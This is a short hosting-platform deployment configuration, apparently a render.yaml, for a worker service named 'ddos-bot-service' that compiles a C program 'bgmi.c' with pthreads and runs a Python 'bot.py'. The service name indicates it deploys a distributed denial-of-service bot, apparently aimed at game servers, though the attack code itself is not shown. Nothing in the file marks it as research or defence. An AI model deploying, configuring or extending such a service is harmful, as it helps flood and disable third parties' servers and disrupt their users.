services:
  - type: worker
    name: ddos-bot-service
    env: python
    buildCommand: "gcc bgmi.c -o bgmi -pthread && pip install -r requirements.txt"
    startCommand: "python bot.py"
    envVars:
      - key: PYTHON_VERSION
        value: 3.10.13
        
